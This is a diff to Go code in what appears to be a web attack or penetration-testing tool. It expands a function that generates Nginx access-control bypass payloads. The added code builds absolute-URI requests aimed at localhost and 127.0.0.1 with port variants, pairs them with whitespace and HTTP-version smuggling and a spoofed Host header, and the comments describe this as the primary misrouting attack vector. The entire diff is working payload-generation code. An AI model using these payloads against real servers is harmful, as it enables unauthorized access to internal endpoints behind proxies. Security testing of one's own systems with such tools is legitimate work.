@@ -870,20 +870,55 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	schemes := []string{
 		"http://",
 		"https://",
-		"ftp://",    // Less common schemes to test
 		"gopher://", // parser behavior
 		"data:",     // Protocol handlers that might bypass restrictions
 		"file://",
 	}
 
+	// Alternative hosts to test in Absolute-URI (targeting host misrouting)
+	alternativeHosts := []string{
+		"localhost",
+		"127.0.0.1",
+		"localhost:" + parsedURL.Port, // With port if original URL had one
+		"127.0.0.1:" + parsedURL.Port, // With port if original URL had one
+	}
+
+	// If the parsed URL has no port but uses standard ports, add those variants
+	if parsedURL.Port == "" {
+		alternativeHosts = append(alternativeHosts, "localhost:80", "localhost:443")
+		alternativeHosts = append(alternativeHosts, "127.0.0.1:80", "127.0.0.1:443")
+	}
+
 	// 1. Simple absolute URI in path
 	for _, scheme := range schemes {
-		// Plain absolute URI in the path
+		// Original host variant
 		job := baseJob
 		absoluteURI := scheme + parsedURL.Host + basePath
 		job.RawURI = absoluteURI + query
 		job.PayloadToken = GeneratePayloadToken(job)
 		allJobs = append(allJobs, job)
+
+		// NEW TECHNIQUE: Host misrouting using localhost instead of original host
+		// This exploits the behavior seen in the diagram where Nginx routes to localhost
+		// while HAProxy still sees the target.com Host header
+		for _, altHost := range alternativeHosts {
+			job := baseJob
+			absoluteURI := scheme + altHost + basePath
+			job.RawURI = absoluteURI + query
+			job.PayloadToken = GeneratePayloadToken(job)
+			allJobs = append(allJobs, job)
+
+			// Also try keeping the Host header explicitly set to original host
+			// This is exactly the scenario in the image: localhost in URI, target.com in Host header
+			jobWithHostHeader := baseJob
+			jobWithHostHeader.RawURI = absoluteURI + query
+			jobWithHostHeader.Headers = append(jobWithHostHeader.Headers, Headers{
+				Header: "Host",
+				Value:  parsedURL.Host,
+			})
+			jobWithHostHeader.PayloadToken = GeneratePayloadToken(jobWithHostHeader)
+			allJobs = append(allJobs, jobWithHostHeader)
+		}
 
 		// Also try with subdomain variations (for potential domain parser bugs)
 		if !strings.Contains(parsedURL.Host, "localhost") && strings.Count(parsedURL.Host, ".") > 0 {
@@ -902,13 +937,37 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 	// 2. Combine Absolute-URI with whitespace technique for most powerful bypass
 	for _, whitespace := range whitespaceVariants {
 		for _, scheme := range schemes {
-			// A. Whitespace + Absolute-URI
+			// A. Whitespace + Absolute-URI with original host
 			job := baseJob
 			job.RawURI = basePath + whitespace.raw + scheme + parsedURL.Host + basePath + query
 			job.PayloadToken = GeneratePayloadToken(job)
 			allJobs = append(allJobs, job)
 
-			// URL-encoded whitespace version
+			// Whitespace + Absolute-URI with localhost (primary misrouting attack vector)
+			for _, altHost := range alternativeHosts {
+				job := baseJob
+				job.RawURI = basePath + whitespace.raw + scheme + altHost + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+
+				// URL-encoded whitespace version
+				job = baseJob
+				job.RawURI = basePath + whitespace.urlEnc + scheme + altHost + basePath + query
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+
+				// With explicit Host header (exactly like in the diagram)
+				job = baseJob
+				job.RawURI = basePath + whitespace.raw + scheme + altHost + basePath + query
+				job.Headers = append(job.Headers, Headers{
+					Header: "Host",
+					Value:  parsedURL.Host,
+				})
+				job.PayloadToken = GeneratePayloadToken(job)
+				allJobs = append(allJobs, job)
+			}
+
+			// URL-encoded whitespace version (original host)
 			job = baseJob
 			job.RawURI = basePath + whitespace.urlEnc + scheme + parsedURL.Host + basePath + query
 			job.PayloadToken = GeneratePayloadToken(job)
@@ -916,12 +975,32 @@ func (pg *PayloadGenerator) GenerateNginxACLsBypassPayloads(targetURL string, by
 
 			// B. Whitespace + HTTP + whitespace + Absolute-URI (complex case)
 			for _, httpVersion := range httpVersions {
+				// Original host
 				job := baseJob
 				job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + parsedURL.Host + basePath + query
 				job.PayloadToken = GeneratePayloadToken(job)
 				allJobs = append(allJobs, job)
 
-				// URL-encoded version
+				// Localhost variants with HTTP version for complex cases
+				for _, altHost := range alternativeHosts {
+					// Raw version
+					job := baseJob
+					job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + altHost + basePath + query
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+
+					// With explicit Host header
+					job = baseJob
+					job.RawURI = basePath + whitespace.raw + httpVersion + whitespace.raw + scheme + altHost + basePath + query
+					job.Headers = append(job.Headers, Headers{
+						Header: "Host",
+						Value:  parsedURL.Host,
+					})
+					job.PayloadToken = GeneratePayloadToken(job)
+					allJobs = append(allJobs, job)
+				}
+
+				// URL-encoded version (original host)
 				job = baseJob
 				job.RawURI = basePath + whitespace.urlEnc + httpVersion + whitespace.urlEnc + scheme + parsedURL.Host + basePath + query
 				job.PayloadToken = GeneratePayloadToken(job)
